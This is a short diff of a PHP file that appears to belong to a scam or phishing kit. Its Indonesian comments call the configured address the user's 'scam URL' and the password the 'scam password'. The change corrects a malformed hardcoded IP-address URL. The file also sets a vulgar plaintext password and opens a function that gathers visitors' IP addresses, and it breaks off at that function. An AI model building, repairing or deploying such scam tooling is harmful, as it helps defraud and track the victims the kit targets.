@@ -1,5 +1,5 @@
 <?php
-$url = "https://https://45.147.231.227/"; // URL scam anda (Wajib menggunakan HTTPS)
+$url = "https://45.147.231.227/"; // URL scam anda (Wajib menggunakan HTTPS)
 $password = "@Kontol99"; // Password Scam (sesuaikan dengan password di config scam)
 
 function getUserIPs()
